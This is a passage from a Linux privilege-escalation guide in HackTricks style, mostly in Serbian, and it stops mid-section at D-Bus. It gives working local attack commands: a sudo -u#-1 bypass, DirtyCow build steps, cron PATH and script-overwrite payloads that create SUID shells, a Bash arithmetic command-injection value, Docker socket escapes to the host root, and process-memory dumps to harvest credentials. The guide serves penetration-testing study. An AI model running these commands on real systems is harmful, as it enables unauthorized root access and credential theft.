# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### Informacije o OS-u

Počnimo sa prikupljanjem informacija o pokrenutom OS-u
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Putanja

Ako **imate dozvole za pisanje na bilo koji folder unutar `PATH`** promenljive, možda ćete moći da hijack some libraries or binaries:
```bash
echo $PATH
```
### Informacije o okruženju

Da li se u promenljivim okruženjima nalaze zanimljive informacije, lozinke ili API ključevi?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite kernel verziju i da li postoji neki exploit koji se može iskoristiti za escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobru listu ranjivih kernela i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi gde možete pronaći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive kernel verzije sa te web stranice možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći pri pretraživanju kernel exploita su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (izvršiti na žrtvi, samo proverava exploits za kernel 2.x)

Uvek **pretražite verziju kernela na Google-u**, možda je vaša verzija kernela pomenuta u nekom kernel exploit-u i tada ćete biti sigurni da je taj exploit validan.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Na osnovu ranjivih verzija sudo koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo verzije pre 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) omogućavaju neprivilegovanim lokalnim korisnicima da eskaliraju svoje privilegije na root putem sudo `--chroot` opcije kada se fajl `/etc/nsswitch.conf` koristi iz direktorijuma koji kontroliše korisnik.

Evo [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) za iskorišćavanje te [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Pre pokretanja eksploita, uverite se da je vaša `sudo` verzija ranjiva i da podržava `chroot` funkcionalnost.

Za više informacija, pogledajte originalni [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verifikacija potpisa nije uspela

Proverite **smasher2 box of HTB** za **primer** kako se ovaj vuln može iskoristiti
```bash
dmesg 2>/dev/null | grep "signature"
```
### Više system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabroj moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako se nalazite unutar docker container-a, možete pokušati da pobegnete iz njega:


{{#ref}}
docker-security/
{{#endref}}

## Diskovi

Proverite **šta je montirano i demontirano**, gde i zašto. Ako je nešto demontirano, pokušajte da ga montirate i proverite ima li privatnih podataka.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Nabrojite korisne binarne fajlove
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite da li je instaliran **bilo koji compiler**. Ovo je korisno ako treba da koristite neki kernel exploit, jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili u sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara verzija Nagiosa (na primer) koja bi mogla biti iskorišćena za eskalaciju privilegija…\
Preporučuje se ručno proveriti verziju instaliranog softvera koji deluje sumnjivo.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini možete takođe koristiti **openVAS** da proverite zastareli i ranjivi softver instaliran na mašini.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će većinom biti beskorisne, zato se preporučuje korišćenje aplikacija poput OpenVAS ili sličnih koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate exploits_

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** pokrenuti — možete ih iskoristiti za eskalaciju privilegija](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih detektuje proverom `--inspect` parametra u komandnoj liniji procesa.\
Takođe **proverite svoje privilegije nad binarnim fajlovima procesa**, možda možete prepisati neki od njih.

### Process monitoring

Možete koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti veoma korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Process memory

Neke usluge na serveru čuvaju **kredencijale u čistom tekstu u memoriji**.\
Obično će vam trebati **root privileges** da biste pročitali memoriju procesa koji pripadaju drugim korisnicima, zato je ovo obično korisnije kada ste već root i želite da otkrijete još kredencijala.\
Međutim, zapamtite da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

> [!WARNING]
> Imajte na umu da većina mašina danas **ne dozvoljava ptrace po defaultu**, što znači da ne možete dump-ovati druge procese koji pripadaju vašem neprivilegovanom korisniku.
>
> Fajl _**/proc/sys/kernel/yama/ptrace_scope**_ kontroliše dostupnost ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi mogu biti debug-ovani, pod uslovom da imaju isti uid. Ovo je klasičan način na koji je ptrace radio.
> - **kernel.yama.ptrace_scope = 1**: može biti debug-ovan samo roditeljski proces.
> - **kernel.yama.ptrace_scope = 2**: samo admin može koristiti ptrace, jer zahteva CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: nijedan proces se ne može trace-ovati pomoću ptrace. Nakon podešavanja, potreban je reboot da bi se ptrace ponovo omogućio.

#### GDB

Ako imate pristup memoriji FTP servisa (na primer) možete dohvatiti Heap i pretražiti unutar njega kredencijale.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB skripta
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps prikazuju kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; takođe prikazuju **dozvole svake mapirane regije**. Pseudo fajl **mem** **otkriva samu memoriju procesa**. Iz **maps** fajla znamo koje **memorijske regije su čitljive** i njihove offsete. Koristimo ove informacije da **seek into the mem file and dump all readable regions** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` omogućava pristup sistemskoj **fizičkoj** memoriji, a ne virtuelnoj memoriji. Kernelov prostor virtuelnih adresa može se pristupiti koristeći /dev/kmem.\
Obično je `/dev/mem` čitljiv samo od strane **root** i grupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump je Linux verzija klasičnog ProcDump alata iz Sysinternals skupa alata za Windows. Nabavite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za dump memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti root zahteve i dump-ovati proces koji je u vašem vlasništvu
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root je potreban)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako otkrijete da je proces authenticator pokrenut:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dump the process (pogledajte prethodne sekcije da pronađete različite načine da dump the memory of a process) i pretražiti credentials unutar memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti kredencijale u čistom tekstu iz memorije** i iz nekih **poznatih fajlova**. Za ispravan rad zahteva root privilegije.

| Funkcija                                          | Naziv procesa        |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktivne FTP konekcije)                    | vsftpd               |
| Apache2 (aktivne HTTP Basic Auth sesije)         | apache2              |
| OpenSSH (aktivne SSH sesije - korišćenje sudo)    | sshd:                |

#### Pretraga Regex-a/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron jobovi

### Crontab UI (alseambusher) radi kao root – web-bazirani scheduler privesc

Ako web “Crontab UI” panel (alseambusher/crontab-ui) radi kao root i vezan je samo za loopback, i dalje mu možete pristupiti preko SSH local port-forwarding i kreirati privilegovani job za privesc.

Tipičan lanac
- Otkrivanje porta dostupnog samo na loopback-u (npr., 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronađi kredencijale u operativnim artefaktima:
  - Backupi/skripte sa `zip -P <password>`
  - systemd jedinica koja izlaže `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tuneluj i prijavi se:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreiraj job sa visokim privilegijama i pokreni odmah (postavlja SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristi ga:
```bash
/tmp/rootshell -p   # root shell
```
Ojačavanje bezbednosti
- Ne pokrećite Crontab UI kao root; ograničite ga na poseban korisnički nalog sa minimalnim privilegijama
- Podesite da sluša samo na localhost i dodatno ograničite pristup preko firewall-a/VPN-a; ne ponovo koristite lozinke
- Izbegavajte ubacivanje tajni u unit files; koristite secret stores ili root-only EnvironmentFile
- Omogućite audit/logging za on-demand izvršenja jobova

Proverite da li je neki scheduled job ranjiv. Možda možete iskoristiti skriptu koja se izvršava kao root (wildcard vuln? možete li izmeniti fajlove koje root koristi? koristiti symlinks? kreirati specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Na primer, u okviru _/etc/crontab_ možeš pronaći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Pogledaj kako korisnik "user" ima privilegije upisa nad /home/user_)

Ako u ovom crontab-u korisnik root pokuša da izvrši neku komandu ili skript bez podešene PATH. Na primer: _\* \* \* \* root overwrite.sh_\
Tada, možeš dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron koji koristi skriptu sa wildcard (Wildcard Injection)

Ako se skripta izvršava kao root i sadrži “**\***” u okviru komande, možete to iskoristiti da postignete neočekivane stvari (npr. privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako wildcard prethodi putanji kao što je** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više trikova za iskorišćavanje wildcard-a:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash izvršava parametarsko proširenje i zamenu komandom pre aritmetičke evaluacije u ((...)), $((...)) i let. Ako cron/parser koji radi kao root čita nepouzdana polja iz loga i ubacuje ih u aritmetički kontekst, napadač može da injektuje zamenu komandom $(...) koja se izvršava kao root kada cron radi.

- Zašto to radi: U Bash-u, proširenja se dešavaju u sledećem redosledu: parametarsko/varijabilno proširenje, zamena komandom, aritmetičko proširenje, a zatim razdvajanje reči i proširenje putanje. Dakle, vrednost poput `$(/bin/bash -c 'id > /tmp/pwn')0` se prvo zameni (izvršavajući komandu), a preostali numerički `0` se koristi za aritmetiku tako da skripta nastavi bez grešaka.

- Tipičan ranjiv obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacija: Naterajte da se u parsirani log upiše tekst koji kontroliše napadač tako da polje koje izgleda numerički sadrži zamenu komandom i završava cifrom. Obezbedite da vaša komanda ne piše na stdout (ili je preusmerite) kako bi aritmetika ostala validna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ako možete **izmeniti cron skriptu** koju izvršava root, možete vrlo lako dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako skripta koju izvršava root koristi **direktorijum u kojem imate potpuni pristup**, možda bi bilo korisno obrisati taj direktorijum i **napraviti symlink ka drugom direktorijumu** koji izvršava skriptu pod vašom kontrolom
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Učestali cron jobs

Možete nadgledati procese kako biste pronašli one koji se izvršavaju na svakih 1, 2 ili 5 minuta. Možda to možete iskoristiti za escalate privileges.

Na primer, da biste **nadgledali svakih 0.1s tokom 1 minute**, **sortirali po najmanje izvršenim komandama** i obrisali komande koje su se najviše izvršavale, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Takođe možete koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i prikazati listu svakog procesa koji se pokrene).

### Nevidljivi cron jobs

Moguće je kreirati cronjob **stavljanjem carriage return-a nakon komentara** (bez znaka novog reda), i cron job će raditi. Primer (obrati pažnju na carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### Upisivi _.service_ fajlovi

Proverite da li možete da pišete u bilo koji `.service` fajl, ako možete, vi **možete da ga izmenite** tako da on **izvrši** vaš **backdoor kada** se servis **pokrene**, **restartuje** ili **zaustavi** (možda će biti potrebno da sačekate da se mašina restartuje).\
Na primer kreirajte vaš backdoor unutar .service fajla sa **`ExecStart=/tmp/script.sh`**

### Upisivi service binarni fajlovi

Imajte na umu da ako imate **pristup za pisanje nad binarnim fajlovima koje izvršavaju servisi**, možete ih izmeniti i ubaciti backdoors tako da kada se servisi ponovo pokrenu backdoors budu izvršeni.

### systemd PATH - Relative Paths

Možete videti PATH koji koristi **systemd** sa:
```bash
systemctl show-environment
```
Ako otkrijete da možete **pisati** u bilo kojem direktorijumu na putanji, možda ćete moći **escalate privileges**. Potrebno je da tražite **relativne putanje koje se koriste u konfiguracionim fajlovima servisa** kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim kreirajte **executable** sa **istim imenom kao relativni path do binarnog fajla** unutar systemd PATH foldera u koji možete pisati, i kada se od service zatraži izvršenje ranjive akcije (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu start/stop servise, ali proverite da li možete koristiti `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Timers**

**Timers** su systemd unit fajlovi čije se ime završava sa `**.timer**` i koji kontrolišu `**.service**` fajlove ili događaje. **Timers** se mogu koristiti kao alternativa cron-u, jer imaju ugrađenu podršku za događaje zasnovane na kalendarskom vremenu i za monotoni vremenski raspored, i mogu se pokretati asinhrono.

Možete izlistati sve timere pomoću:
```bash
systemctl list-timers --all
```
### Tajmeri koji se mogu menjati

Ako možeš da izmeniš tajmer, možeš da ga nateraš da izvrši neke postojeće systemd.unit (kao `.service` ili `.target`)
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> Jedinica koja se aktivira kada istekne ovaj timer. Argument je ime jedinice, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano pokazuje na service koji ima isto ime kao timer jedinica, osim sufiksa. (Vidi gore.) Preporučuje se da ime jedinice koja se aktivira i ime timer jedinice budu identična, osim sufiksa.

Therefore, to abuse this permission you would need to:

- Pronađite neku systemd unit (like a `.service`) koja **izvršava upisiv binarni fajl**
- Pronađite neku systemd unit koja **izvršava relativnu putanju** i nad kojom imate **upisna prava** nad **systemd PATH** (da imitujete taj izvršni fajl)

**Learn more about timers with `man systemd.timer`.**

### **Enabling Timer**

Da biste omogućili timer, potrebne su root privileges i da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Sirova konekcija
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da može postojati nekoliko **sockets listening for HTTP** zahteva (_ne mislim na .socket files već na fajlove koji se ponašaju kao unix sockets_). Možete to proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako socket **odgovara na HTTP zahteve**, onda možete **komunicirati** sa njim i možda **iskoristiti neku ranjivost**.

### Writable Docker Socket

Docker socket, koji se često nalazi na `/var/run/docker.sock`, je kritičan fajl koji treba biti zaštićen. Podrazumevano, upisivan je od strane korisnika `root` i članova grupe `docker`. Posedovanje upisnog pristupa ovom socketu može dovesti do privilege escalation. Evo pregleda kako se to može uraditi i alternativnih metoda ako Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imate upisni pristup Docker socketu, možete escalate privileges koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande vam omogućavaju da pokrenete container sa root pristupom fajl sistemu hosta.

#### **Korišćenje Docker API-ja direktno**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **List Docker Images:** Preuzmite listu dostupnih image-ova.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošaljite zahtev za kreiranje container-a koji mountuje root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Koristite `socat` da uspostavite konekciju ka container-u, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete izvršavati komande direktno u container-u sa root pristupom fajl sistemu hosta.

### Ostalo

Imajte na umu da ako imate write permisije nad docker socket-om zato što ste **u grupi `docker`** imate [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Pogledajte **više načina da se pobegne iz docker-a ili da se zloupotrebi za eskalaciju privilegija** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) eskalacija privilegija

Ako ustanovite da možete koristiti komandу **`ctr`**, pročitajte sledeću stranu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** eskalacija privilegija

Ako ustanovite da možete koristiti komandу **`runc`**, pročitajte sledeću stranu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran sistem za međuprocesnu komunikaciju (IPC) koji omogućava aplikacijama da efikasno međusobno komuniciraju i dele podatke. Dizajniran za moderne Linux sisteme, nudi robustan okvir za različite oblike komunikacije između aplikacija.

Sistem je svestran, podržava osnovni IPC koji unapređuje razmenu podataka između procesa, podsećajući na poboljšane UNIX domain sockets. Takođe pomaže u emitovanju događaja ili signala, olakšavajući integraciju među komponentama sistema. Na primer, signal od Bluetooth daemona o dolazećem pozivu može naterati plejer muzike da utiša zvuk, poboljšavajući korisničko iskustvo. Dodatno, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za servisima i pozive metoda između aplikacija, čime se pojednostavljuju procesi koji su tradicionalno bili složeni.

D-Bus radi po modelu **allow/deny model**, upravljajući permisijama za poruke (pozivi metoda, emitovanje signala, itd.) na osnovu kumulativnog efekta pravila politike koja se poklapaju. Ove politike definišu interakcije sa bus-om, potencijalno omogućavajući eskalaciju privilegija kroz zloupotrebu tih permisija.

Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` je prikazan, detaljno navodeći permisije za korisnika root da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez specificiranog korisnika ili grupe se primenjuju univerzalno, dok se politike u "default" kontekstu primenjuju na sve koji nisu pokriveni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte kako da enumerišete i iskoristite D-Bus komunikaciju ovde:**


{{#ref}}
